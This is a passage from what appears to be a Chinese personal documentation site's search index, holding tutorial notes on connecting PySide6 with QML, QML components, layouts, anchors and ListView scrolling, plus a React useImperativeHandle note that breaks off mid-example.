如何将QML与Python联系起来. 有两种方式 方式一: 注册QML控件 就像官网给的例子 在Python的入口文件定义 # To be used on the @QmlElement decorator # (QML_IMPORT_MINOR_VERSION is optional) QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 在QML中使用的时候直接导入即可 import io . qt . textproperties 1.0 Bridge { id: bridge } 这里要注意, 因为官网是直接定义在入口文件的, 所以不用手动注册,\n如果不是定义在入口文件, 需要手动注册, 比如 QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 @QmlElement class Bridge ( QObject ): ... # 手动注册 qmlRegisterType ( Bridge , QML_IMPORT_NAME , QML_IMPORT_MAJOR_VERSION , 0 , \"Bridge\" ) 同理, 这里自己的 utilHelper 应该这样做. 在 Python 文件中加入 QML_IMPORT_NAME = \"yq.com.qt.util\" QML_IMPORT_MAJOR_VERSION = 1 # 下面是 像上面例子那样的定义 class UtilHelper ( QObject ): ... # 注册 qmlRegisterType ( UtilHelper , QML_IMPORT_NAME , QML_IMPORT_MAJOR_VERSION , 0 , \"UtilHelper\" ) 在QML中使用 UtilHelper { id: utilHelper } 方式二: 设置上下文 类似这样 utilHelper = UtilHelper () engine . rootContext () . setContextProperty ( \"utilHelper\" , utilHelper ) 在QML使用的时候, 就不用像第一种那样手动定义 utilHelper ,\n直接调用就行 utilHelper . xxx 部分参考: QML与python互相通信 关于槽函数返回值 返回值如果是 tuple , 建议换成 list ,\n因为 tuple 在 QML 中只能拿到一个空的 QVariant . 找了很多资料都没解决. 而换成 list , 就可以直接用数组索引拿值了.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-Python-communication.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-Python-communication.html"},{"title":"QML常用组件","text":"相关资源: 所有QML控件: https://doc.qt.io/qt-6/qmltypes.html 视图组件见: QML组件-视图组件 布局组件见: QML组件-布局组件 此页的应该说是 特殊的对象类型 而非组件 Component 内置组件类型, 默认不会显示,\n.. 需要使用 Component.createObject 创建组件. Component 内定义的组件将 QML 类型封装在其中，就好像它们是在单独的 QML 文件中定义的一样，并且在请求之前不会加载。 如 import QtQuick 2.0 Item { width: 100 ; height: 100 Component { id: redSquare Rectangle { color: \"red\" width: 10 height: 10 } } Loader { sourceComponent: redSquare } Loader { sourceComponent: redSquare ; x: 20 } } 由于 Component 不是从 Item 派生的，因此无法将任何内容锚定到它。 定义组件类似于定义 QML 文档 Component 类型通常用于为视图提供图形组件。例如， ListView::delegate 属性需要一个组件来指定每个列表项的显示方式。 组件对象也可以使用 Qt.createComponent() 动态创建。 属性成员 progress : real 加载组件的进度，从 0.0（未加载）到 1.0（已完成）。 status : enumeration 此属性保存组件加载的状态。 Component.Null：没有可用的组件数据 Component.Ready：组件已加载，可用于创建实例。 Component.Loading：当前正在加载组件 Component.Error：加载组件时发生错误。errorString() 将提供错误的描述。 url : url 用于构造组件的 URL。 信号成员 completed(): 在对象被实例化后发出。这可用于在启动时执行脚本代码。 Rectangle { Component.onCompleted: console . log ( \"Completed Running!\" ) Rectangle { Component.onCompleted: console . log ( \"Nested Completed Running!\" ) } } destruction(): 当对象开始销毁时发出。 Rectangle { Component.onDestruction: console . log ( \"Destruction Beginning!\" ) Rectangle { Component.onDestruction: console . log ( \"Nested Destruction Beginning!\" ) } } 成员函数 object createObject(QtObject parent, object properties) 创建并返回此组件的对象实例，该对象实例将具有给定的父级和属性。属性参数是可选的。如果对象创建失败，则返回 null。 string errorString() 返回错误的描述。 该字符串包括每个错误的文件、位置和描述。如果存在多个错误，它们由换行符分隔。 object incubateObject(Item parent, object properties, enumeration mode) 创建该组件对象的\"孵化器\"，该\"孵化器\"用来生成组件对象。允许异步创建，并且不会导致 UI 冻结。如果创建不成功则返回 null。 所有三个参数都是可选的。 parent 指定创建的实例将具有的父级。省略参数或传递 null 将创建一个没有父对象的对象。在这种情况下，必须持有对所创建对象的引用，以便垃圾收集器不会销毁它。 properties 指定为一个属性值项目的映射，这些项目将在其构造期间在创建的对象上设置。 mode 可以是 Qt.Synchronous 或 Qt.Asynchronous，控制实例是同步创建还是异步创建。默认是异步的。在某些情况下，即使指定了 Qt.Synchronous，孵化器也可能会异步创建对象。比如调用 incubateObject() 的组件本身是异步创建的，就会发生这种情况。 此部分参考: QML类型：Component（组件）","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module.html"},{"title":"QML组件-布局组件","text":"相关资源: 所有QML控件: https://doc.qt.io/qt-6/qmltypes.html 视图组件见: QML组件-视图组件 常用组件见: QML组件 RowLayout QtQuick.Layouts 模块中提供的一种布局组件 用于在水平方向上排列其子元素。它提供了更多的布局控制选项，如\n对齐 (Layout.alignment)、\n填充 (Layout.fillWidth 和 Layout.fillHeight)、\n弹性系数 (Layout.maximumWidth 和 Layout.maximumHeight)\n等，以便更灵活地控制子元素的布局 继承 item类 属性 layoutDirection 设置布局的布局方向。 spacing 设置每个单元格之间的间距。 布局中的项支持以下附加属性 Layout.minimumWidth 设置布局中项的最小宽度。将该值设置为-1将把宽度重置为隐式的最小宽度。 Layout.minimumHeight 设置布局中项目的最小高度。 Layout.preferredWidth 设置布局中项目的首选宽度。如果首选宽度是-1，它将被忽略，而布局将使用implicitWidth代替。缺省值是-1。 Layout.preferredHeight 设置布局中项目的首选高度。 Layout.maximumWidth 设置布局中项的最大宽度。 Layout.maximumHeight 设置布局中项的最大高度。 Layout.fillWidth 如果此属性为true，则该项将在遵守给定约束的情况下尽可能宽（可拉伸）。如果该属性为false，则将该项的首选宽度设置为固定宽度。默认为false，除了布局本身，它默认为true。 Layout.fillHeight Layout.alignment 此属性允许您指定项在其占用的单元格中的对齐方式。格式：Qt.AlignCenter Layout.margins 设置项的外边距。需导入 QtQuick.Layouts 1.2 Layout.leftMargin 设置项的左外边距。需导入 QtQuick.Layouts 1.2 Layout.rightMargin Layout.topMargin Layout.bottomMargin ColumnLayout 与 RowLayout 基本一致, 就是从行变成了列. 补充一些使用方面的. Text 是 Layout 的直接子元素时, 不能设置 Layout.preferredWidth`跟 `preferredHeight ,\n否则 Layout.alignment 失效,\n大抵是 固定宽度、高度、anchors 设置等, 可能限制了布局容器自身或其子项的自由度 // 不能设置大小, 否则 Layout.alignment: Qt.AlignHCenter | Qt.AlignVCenter 失效\n// Layout.preferredWidth: parent.width\n// Layout.preferredHeight: parent.height 布局属性比如 ``Layout.fillWidth`` 只能用于 `Layout` 的子组件, 不能用于 `Layout` 本身 ,\n除非 Layout 本身是另一个 Layout 的直接子组件。 GridLayout 使用网格系统布局子组件。 FlowLayout 根据可用空间动态流动地排列子组件。 StackLayout 只显示一个子组件，可通过切换索引来更改显示内容。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module-layout.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module-layout.html"},{"title":"QML组件-视图组件","text":"相关资源: 所有QML控件: https://doc.qt.io/qt-6/qmltypes.html 布局组件见: QML组件-布局组件 常用组件见: QML组件 ComboBox 类似于HTML的 Select 选择框组件. (还是 React 的, 不记得了) FolderDialog 属于 Qt.labs.platform 文件夹选择器 Button 提供可点击的按钮功能，通常包含文本或图标。 Label 标签 Row 行. QtQuick.Controls 模块中的一个可视组件 Column 列 BusyIndicator 转圈等待的那个圈 Popup 弹出组件, 比如临时消息弹出可以用 MouseArea 鼠标可点击行为区域. 常用此组件来进行一些点击相关的行为, 比如实现鼠标移入(类HTML的hover) 支持的属性 containsMouse 鼠标是否在组件内 pressed 鼠标是否按下. 支持的事件 onEntered 鼠标移入 onExited 鼠标移出 onContainsMouseChanged 鼠标是否在组件内改变 实现 hover import QtQuick 2.0 Rectangle { width: 400 height: 300 MouseArea { id: textMouseArea anchors.fill: text // 重点 hoverEnabled: true Text { id: myText text: \"Hover over me for a tooltip\" } Text { id: myText1 text: \"Hover over me for a tooltip\" anchors.centerIn: parent // 只有鼠标移入时候才显示 visible: textMouseArea . containsMouse && textMouseArea . pressed === false } // 如果不用 textMouseArea.containsMouse && textMouseArea.pressed === false // 可以用 onEntered{ myText1.visible = true } property bool mouseIsInsideText: containsMouse onContainsMouseChanged: { console . log ( \"Mouse is inside Text:\" , containsMouse ) } } } 最重要是将需要hover组件fill到 MouseArea , 这里是 anchors.fill: text . 如果位于 Layout 下, 由于 Layout 的直接子元素不能使用 anchors , 所以可以反过来放 Text { id: myText text: \"Hover over me for a tooltip\" anchors.centerIn: parent MouseArea { id: textMouseArea anchors.fill: text // 重点 hoverEnabled: true // onEntered: { //     // 进入 // } // onExited: { //     退出 // } } } ApplicationWindow 官网: ApplicationWindow QML Type 比较特殊的窗口, 相对于 Window ,  可以方便添加 menu bar , header 和 footer Rectangle 矩形窗口 Image 用于显示图像资源。 Text 用于显示文本内容，支持富文本格式和各种样式属性。 Slider 用户可以滑动以选择连续区间内的值。 TextInput 提供文本输入框，允许用户输入和编辑文本。 StackView 以栈的形式管理子组件. 写内联组件时, 一般与 Component 组件一起使用, 这样就不用手动管理组件的 visible 等属性了. Loader 用于加载其他组件. ListView 滚动数据列表视图 属性 currentIndex 当前选择的索引 SwipeView 通过滑动切换视图 Itme 相当于 div , 是通用的容器元素，用于组合和布局其他元素。\n它没有默认的可见外观，但可以设置尺寸、位置和其他属性，以控制其包含的元素。 很多元素 比如 ApplicationWindow 不能直接设置 margin , 这个时候可以在外面套一个 Itme 来实现这个 比如 import QtQuick 2.15 import QtQuick . Controls 2.15 ApplicationWindow { visible: true width: 400 height: 300 title: \"Margin Example\" Item { anchors.fill: parent anchors.margins: 20 // 设置容器元素的边距 Rectangle { anchors.fill: parent color: \"lightgray\" // 在容器元素中放置窗口内容 Text { anchors.centerIn: parent text: \"Window Content\" font.pixelSize: 20 } } } }","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module-vis.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-common-module-vis.html"},{"title":"多组件/QML/页面切换","text":"大体上有几种方案 使用 Loader , 决定加载哪个QML文件 使用 StackView , 用栈堆来管理QML文件 使用 Loader 使用 StackView","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses--other-qml-switch.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses--other-qml-switch.html"},{"title":"导入其他QML/组件","text":"如何导入 使用路径导入 可以直接使用绝对/相对路径导入, 路径需要加引号, 注意只能导入文件夹, 不能导入文件.\n比如 import \"./CustomComponents/\" as CustomComponents , 需要用这目录下的组件, 就直接 CustomComponents.ComponentName 即可. 如果你直接导入文件 import \"./CustomComponents/ComponentName.qml\" , 基本会收获报错 \"./CustomComponents/ComponentName.qml\", no such directory .\n这是个坑点. 注解 我比较诧异的就是这一点, 看到CSDN上有些教程直接导入的文件, 不知道是怎么做到的 如果遇到报错: Type xxx unavailable 说明组件定义的有问题, 看看最后的报错是啥慢慢找 模块注册导入 模块注册 在被导入的文件夹, 建立 qmldir 文件.\n比如 \"./CustomComponents/\" ,\n内容为需要导出的组件. 大致语法. module CustommComponents // [singleton] [模块名] [版本] 模块文件 // singleton 表示单例 比如我的模块QML文件放在 CustommComponents 目录下,\n下面有个 App.qml , 那么我的 qmldir 文件这样写 module CustommComponents App 1.0 App . qml // 第二行可以直接 // App.qml 模块名称， 应与模块所在的目录名称完全一致 模块导入 现在我们来使用上面注册的模块. 其他QML导入 import CustommComponents 1.0 待续... 此部分参考: https://blog.csdn.net/sonicss/article/details/125342754 QML组件定义-文件组件 一个 QML 文件就可以视为一个组件. 组件是可重用、封装的 QML 类型，具有明确定义的接口。 只有组件根级的属性才能够被其它文件的组件访问 ,\n所以如果想到组件下子组件有属性需要被外部访问, 需要使用 alias 定义别名. // MyButton.qml import QtQuick 2.0 Rectangle { id: root // 导出按钮属性 使用了别名, 可以被外部访问 property alias text: label . text // 自定义点击信号 signal clicked width: 116 ; height: 26 color: \"lightsteelblue\" border.color: \"slategrey\" Text { id: label anchors.centerIn: parent text: \"Start\" } MouseArea { anchors.fill: parent onClicked: { root . clicked () } } } 使用, 这里注意信号需要加 on . // main.qml import QtQuick 2.0 Item { id: root width: 140 height: 120 // 文件式自定义按钮 MyButton { id: myButton x: 12 ; y: 12 text: \"Start\" // 绑定的是自定义的\"clicked信号\" onClicked: { status . text = \"Button clicked!\" } } // 当按钮按下，改变文本的text Text { id: status x: 12 ; y: 76 width: 116 ; height: 26 text: \"waiting ...\" horizontalAlignment: Text . AlignHCenter } } QML组件定义-Component Component 是一种特殊的类型，可以定义一个组件，然后通过 Component.createObject() 创建组件实例。 定义一个 Component 与定义一个 QML 文档类似， Component 只能包含一个顶层 item ，而且在这个 item 之外不能定义任何数据，除了 id 。 import QtQuick 2.0 Item { id: root width: 140 height: 200 // 嵌入式按钮组件 Component { id: buttonComponent Rectangle { id: myButton width: 116 ; height: 26 color: \"lightsteelblue\" border.color: \"slategrey\" // 导出按钮属性 property alias text: label . text // 自定义点击信号 signal clicked Text { id: label anchors.centerIn: parent text: \"Start\" } MouseArea { anchors.fill: parent onClicked: { myButton . clicked () } } } } // Loader加载\"嵌入式自定义按钮\" Loader { id: loader anchors.bottom: parent . bottom anchors.bottomMargin: 4 anchors.horizontalCenter: parent . horizontalCenter sourceComponent: buttonComponent onLoaded: { // item指向myButton item . color = \"green\" } } // target 指向嵌入式按钮组件的顶层item—Rectangle，所以可以直接响应它的clicked信号。 Connections { target: loader . item ; onClicked: { status . text = \"Button clicked!\" } } // 当按钮按下，改变文本的text Text { id: status x: 12 ; y: 76 width: 116 ; height: 26 text: \"waiting ...\" horizontalAlignment: Text . AlignHCenter } } 参考: https://www.cnblogs.com/linuxAndMcu/p/11935778.html#_label2","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-import-other-qml.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-import-other-qml.html"},{"title":"组件布局","text":"布局组件调整大小 当使用布局组件如 QtQuick.Layouts 下的 RowLayout , 子元素的大小是自动适配的,\n这个时候如何调整子元素的大小呢. 使用 Layout.preferredWidth , 表示首选宽度 RowLayout { width: 400 height: 100 Rectangle { color: \"red\" Layout.preferredWidth: parent . width * 0.1 } Rectangle { color: \"green\" Layout.preferredWidth: parent . width * 0.8 } } 注解 布局组件, 不应该直接定义 width 这种属性: width: parent.width * 0.3 而是: Layout.fillHeight: true\nLayout.fillWidth: true\nLayout.preferredWidth: parent.width * 0.3 一些布局属性 Layout.fillWidth : bool 当为true时, 宽度会自动填充父组件;\n当为false时, 宽度会优先找preferredWidth, 如果其值存在, 则固定为 preferredWidth 的值,\n否则会根据min prefer max 这三者的设置进行布局 Layout.fillHeight : bool 填充高度 Layout.preferredWidth 首选宽度 Layout.alignment 对齐方式, 比如 Qt.AlignVCenter 表示垂直居中对齐. 支持的所有对齐 对于水平对齐，Layout.alignment 属性可以取以下值： Qt.AlignLeft：左对齐 Qt.AlignRight：右对齐 Qt.AlignHCenter：水平居中对齐 Qt.AlignJustify：两端对齐（适用于多行文本） 对于垂直对齐，可以取以下值： Qt.AlignTop：顶部对齐 Qt.AlignBottom：底部对齐 Qt.AlignVCenter：垂直居中对齐 Qt.AlignBaseline：基线对齐（通常是文本的基线） 另外 Text 是 Layout 的直接子元素时(不清楚是不是所有的视图组件), 不能设置 Layout.preferredWidth`跟 `preferredHeight ,\n否则 Layout.alignment 失效,\n大抵是 固定宽度、高度、anchors 设置等, 可能限制了布局容器自身或其子项的自由度 Text{\n  // 不能设置大小, 否则 Layout.alignment: Qt.AlignHCenter | Qt.AlignVCenter 失效\n  // Layout.preferredWidth: parent.width\n  // Layout.preferredHeight: parent.height\n\n  Layout.alignment: Qt.AlignHCenter | Qt.AlignVCenter\n\n} 锚点(anchors)属性 anchors.centerIn 垂直, 水平都居中 anchors.horizontalCenter 水平居中于父元素: parent.horizontalCenter anchors.verticalCenter 垂直居中于父元素: parent.verticalCenter anchors.top: parent.top 元素顶部的位置 设置的值不是数字对象而是 边距 , 如: anchors.top: parent.top   // 正确, 是边距\nanchors.top: 300          // 错误, 不能是数字对象 anchors.topMargin 相对于父元素的上边距,\n注意 父元素需要设置高度, 否则无效 如果是第一个元素, 可能要与 anchors.top 一起使用, 否则识别不到位置, topMargin 失效.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-layout-components-adjust-size.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-layout-components-adjust-size.html"},{"title":"ListView 同时支持纵向和横向滚动","text":"注解 源于AI, 还未验证, 先记录 要实现 ListView 同时支持纵向和横向滚动，你可以嵌套使用 ListView。\n外层的 ListView 用于纵向滚动，内层的 ListView 用于横向滚动。 以下是一个示例代码，演示了如何实现 ListView 的纵向和横向滚动 import QtQuick 2.15 import QtQuick . Controls 2.15 ApplicationWindow { width: 400 height: 300 visible: true ListView { width: parent . width height: parent . height orientation: ListView . Vertical model: 10 delegate: ListView { width: parent . width height: 50 orientation: ListView . Horizontal model: 5 delegate: Rectangle { width: 50 height: 50 color: \"red\" border.color: \"black\" } } } }","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-support-both-vertical-and-horizontal-scrolling.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-support-both-vertical-and-horizontal-scrolling.html"},{"title":"两个ListView在竖直方向上同步滚动","text":"使用 onContentYChanged 或者 直接定义两个 Component 的 contentY 属性一致. 后者参考: Qt/ QML :如何在QML中双向同步ScrollView onContentYChanged: { if ( rightListView && rightListView . contentY !== contentY ) rightListView . contentY = contentY } 较完整源码 RowLayout { id: listArea width: parent . width height: parent . height anchors.topMargin: 10 // 左侧列表 ColumnLayout { id: leftList width: parent . width / 2 height: parent . height clip: true ListView { id: leftListView width: parent . width height: parent . height model: testData ? 50 : curItems delegate: Text { text: modelData width: parent . width wrapMode: Text . Wrap color: Material . primaryTextColor // 使用主题的字体颜色 } onContentYChanged: { if ( rightListView && rightListView . contentY !== contentY ) rightListView . contentY = contentY } } } // 右侧列表 ColumnLayout { id: rightList width: parent . width / 2 height: parent . height clip: true ListView { id: rightListView width: parent . width height: parent . height model: testData ? 50 : curItems delegate: Text { text: modelData color: Material . primaryTextColor // 使用主题的字体颜色 width: parent . width wrapMode: Text . Wrap } onContentYChanged: { if ( leftListView && leftListView . contentY !== contentY ) leftListView . contentY = contentY } } } }","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-two-list-view-in-vertical-direction-synchronously-scroll.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-two-list-view-in-vertical-direction-synchronously-scroll.html"},{"title":"QML布局方式","text":"参考: Qt Quick快速入门之qml布局 锚点布局 锚点布局使用 anchors 属性将一个元素的边定位到另一个元素的边，从而确定元素的位置和大小 如下 import QtQuick 2.3 import QtQuick . Window 2.0 Window { id:anchorLayoutWindow ; width: 480 ; height: 320 ; title: \"AnchorLayout\" ; Rectangle { id:rect1 ; width: parent . width ; height: 50 ; color: \"blue\" ; anchors.top: parent . top ; Text { text: \"Top\" ; anchors.horizontalCenter: parent . horizontalCenter ; anchors.top: parent . top ; color: \"white\" ; } } Rectangle { id:rect2 ; width: parent . width / 4 ; color: \"red\" ; anchors.top: rect1 . bottom ; anchors.bottom: rect4 . top anchors.left: parent . left ; Text { text: \"Left\" ; anchors.verticalCenter: parent . verticalCenter ; anchors.left: parent . left ; color: \"white\" ; } } Rectangle { id:rect3 ; color: \"green\" ; width: rect2 . width ; anchors.top: rect1 . bottom ; anchors.bottom: rect4 . top ; anchors.right: parent . right ; Text { text: \"Right\" ; anchors.right: parent . right ; anchors.verticalCenter: parent . verticalCenter ; color: \"white\" ; } } Rectangle { id:rect4 ; width: parent . width ; height: 50 ; color: \"yellow\" ; anchors.bottom: parent . bottom ; Text { text: \"Bottom\" ; anchors.horizontalCenter: parent . horizontalCenter ; anchors.bottom: parent . bottom ; color: \"blue\" ;} } Rectangle { id:rect5 ; color: \"#FF605066\" ; anchors.top: rect1 . bottom ; anchors.bottom: rect4 . top ; anchors.left: rect2 . right ; anchors.right: rect3 . left ; Text { text: \"Center\" ; anchors.centerIn: parent ; color: \"white\" ;} } } 效果 Grid布局 Grid布局有 GridLayout ColumnLayout RowLayout Column Row 其中 ColumnLayout 、 RowLayout 只是 GridLayout 的一种特例， ColumnLayout 表示只有一列， RowLayout 表示只有一行。 GridLayout 使用 columns 、 rows 属性将空间分成若干单元格，\n使用 columnSpacing 、 rowSpacing 确立单元格之间的间隔。\n而 GridLayout 内部元素的大小由 Layout.fillWidth 、 Layout.fillHeight 以及 Layout.preferredWidth 、 Layout.preferredHeight 来确定，\n如 Layout.fillWidth:true 表示宽度填充整个单元格， Layout.preferredWidth 则指定一个建议宽度。 Layout.row 、 Layout.column 确定内部元素处于哪个单元格。 注解 不要将内部元素的宽度、高度、x、y 与 GridLayout 进行绑定，容易导致绑定循环。 Column 、 Row 类似于 html 中的 float 或是 wpf 中的 StackPanel ， 会直接将元素一个个挨在一起， 元素间的间隔使用 spacing 控制 下面是GridLayout布局的一个示例 import QtQuick 2.3 import QtQuick . Window 2.0 import QtQuick . Layouts 1.1 Window { id:gridLayoutWindow ; title: \"GridLayoutWindow\" ; width: 480 ; height: 320 ; GridLayout { id: gridLayout1 columns: 2 ; rows: 2 ; anchors.fill: parent ; anchors.margins: 5 ; columnSpacing: 0 ; rowSpacing: 0 ; Rectangle { id:rect00 ; color: \"red\" ; Layout.fillWidth: true ; Layout.fillHeight: true ; } Rectangle { id:rect01 ; color: \"blue\" ; Layout.fillWidth: true ; Layout.fillHeight: true ; } Rectangle { id:rect10 ; color: \"green\" ; Layout.fillWidth: true ; Layout.fillHeight: true ; Layout.row: 1 ; Layout.column: 1 ; } } } 效果 Grid与Column结合 ColumnLayout 默认就不用考虑在哪一列, 每一列会从左到右依次放置. GridLayout { rows: 3 columns: 3 ColumnLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } ColumnLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } ColumnLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } } 3x3 效果 但是注意, 这是当 组件数量 与 定义的格子一致的情况, 当不一致的时候,\n就会有点不一样 为了更方便的看出区别, 稍微更改了一下内容 注解 这里如果不定义大小就看不到东西 说明: 格子更新为 3x2; 内容更新为 2x3. 效果: 当插入第3列元素的时候, 因为只有2列,\n前两列 红色 与 黄色 色块正常,\n第3列 蓝色 结果就是另起一行的新的一列 Grid与Row结合 与 ColumnLayout 不同.\n当 GridLayout 结合 RowLayout , 默认情况下所有数据会重叠在一行. GridLayout { rows: 3 columns: 3 RowLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } RowLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } RowLayout { Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } Button { text: \"None\" highlighted: true Material.accent : Material . BlueGrey onClicked: { } } } } 说明, 定义 3x3 的格子, 尝试使用 RowLayout , 每一行内三个按钮. 实际效果 明显是有问题的, 本来是想全局 3x3 , 结果都在一行了. RowLayout 的实际表现与 ColumnLayout 有点不一样, ColumnLayout 默认多列是不会重叠的. 那这个时候怎么办? 答案是 手动定义所在的行 Layout.row: 行 . 效果 SplitView SplitView\n用于提供带切分条的布局，下面是示例 import QtQuick 2.3 import QtQuick . Window 2.0 import QtQuick . Layouts 1.1 import QtQuick . Controls 1.2 Window { width: 480 ; height: 320 ; title: \"SplitView\" ; SplitView { anchors.fill: parent ; orientation: Qt . Horizontal ; Rectangle { id:rect1 ; width: 100 ; color: \"red\" ; } Rectangle { id:rect2 ; Layout.fillWidth: true ; Layout.minimumWidth: 50 ; color: \"blue\" ; } Rectangle { id:rect3 ; width: 100 ; color: \"green\" ; } } }","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-layout.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-layout.html"},{"title":"QML模块","text":"QtQuick.Controls 官网: Qt Quick Controls QML Types 提供了众多 QML 类型接口 QtQuick.Controls.Material 官网: Material Style QtQuick.Controls.Material 是 Qt Quick Controls 2 模块中的一个主题模块，\n它提供了一套基于 Material Design 风格的用户界面元素和样式。 Material Design 是由 Google 提出的一种现代化的设计语言，旨在提供一致、直观和美观的用户界面体验。它强调阴影、平面设计、鲜明的颜色和流畅的动画效果等特征。 QtQuick.Controls.Material 模块通过定义了一套预定义的样式和主题，\n使开发者能够轻松地将 Material Design 风格应用到 Qt Quick 应用程序,\n能够快速创建具有现代化外观和交互体验的应用程序。 该模块提供的一些主题元素包括按钮、文本字段、滑块、开关、进度条等，这些元素都使用了 Material Design 风格的外观和动画效果。 支持的 // 设置主题 Material.theme: Material . Dark // 设置主题为暗色 Button { // 按钮的主题 Material.primary: Material . Blue } 顺便提一句, 当使用此方式在外层组件设置主题时, 大部分组件都可以继承到父或祖的主题设置,\n但是有些组件是独立的, 无法继承到, 还是需要手动显示设置颜色, 比如 ListView ,\n因为列表视图的委托（delegate）中的子项是独立的 QML 元素，它们不会自动继承父级控件的颜色属性 import QtQuick 2.15 import QtQuick . Controls 2.15 import QtQuick . Controls . Material 2.15 ApplicationWindow { visible: true width: 800 height: 600 Material.theme: Material . Dark // 设置主题为暗色 ListView { anchors.fill: parent model: [ \"Item 1\" , \"Item 2\" , \"Item 3\" ] delegate: Item { width: listView . width height: 30 Text { text: modelData color: Material . primaryTextColor // 使用主题的字体颜色 anchors.centerIn: parent } } } }","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-qml-module.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-qml-module.html"},{"title":"useImperativeHandle","text":"useImperativeHandle 可以让你在使用 ref 时 自定义暴露给父组件的实例值 。\n或者 给不存在ref属性的函数组件, 增加ref属性 .\n在大多数情况下，应当避免使用 ref 这样的命令式代码。\nuseImperativeHandle 应当与 forwardRef 一起使用 暴露DOM节点时自定义暴露属性 useImperativeHandle 应当与 forwardRef 一起使用,\n调用方式: useImperativeHandle(ref, createHandle, [deps]) 接收一个ref 接收一个函数，这个函数返回的对象即是要暴露出的ref 类似useEffect，接收一个依赖数组 例子: const FancyInput=(props, ref) =>{\n  const inputRef = useRef();\n  useImperativeHandle(ref, () => ({\n      focus: () => {\n        inputRef.current.focus();\n      }\n    }));\n    return <input ref={inputRef} />;\n}\nexport default forwardRef(FancyInput); 渲染: <FancyInput ref={fancyInputRef} /> 的父组件可以调用: fancyInputRef.current.focus() 给非DOM函数组件增加ref属性 方案一: forwardRef 与 暴露DOM节点时自定义暴露属性 例子基本一致 注解 函数组件默认没有ref属性. 仅DOM节点(原生提供的HTML节点)有 不过上面还是用了DOM节点ref, 可能初学时存在混淆,\n加个自定义函数组件作为例子: const PSelect00 = (props: any) => {\n\n    return (\n        <div>p00</div>\n    )\n}\n\n// 调用子组件\nconst PSelect0 = React.forwardRef((props, ref) => {\n\n    // 定义暴露的 ref\n    React.useImperativeHandle(ref, () => ({\n        do1: do1\n    }))\n\n    const do1 = () => {console.log(1)}\n\n    return (\n        <PSelect00>p0</PSelect00>\n    )\n})\n\n// 父组件\nconst PSelect1 = () => {\n    const refP0 = React.useRef()\n    return <PSelect0 ref={refP0}/>\n} 警告 当 forwardRef 内容没有转发 DOM 节点时, 比如此处的: return (\n    <PSelect00>p0</PSelect00>\n) 必须使用 useImperativeHandle 来接收传入的 ref, 否则 ref 为 null.\n比如此处的: // 定义暴露的 ref\nReact.useImperativeHandle(ref, () => ({\n    do1: do1\n})) 显而易见嘛, forward本来就是转发ref的, 你都不转发了, 再不声明useImperativeHandle,\n不就是null. 那你可能会问, 如果两个都定义了ref呢?\n那就是在暴露DOM组件的基础上, 再控制需要暴露的内容. 方案二: 手动处理 ref 与方案一大体一致, 只不过, 不用forwardRef const PSelect00 = ( props : any ) => { return ( < div > p00 < /div> ) } // // 调用子组件 // const PSelect0 = React.forwardRef((props, ref) => { // //     // 定义暴露的 ref //     React.useImperativeHandle(ref, () => ({ //         do1: do1 //     })) // //     const do1 = () => {console.log(1)} // //     return ( //         <PSelect00>p0</PSelect00> //     ) // }) // 调用子组件 const PSelect0 = ( props : { onRef : React.RefObject < any > }) => { // 定义暴露的 ref React . useImperativeHandle ( props . onRef , () => ({ 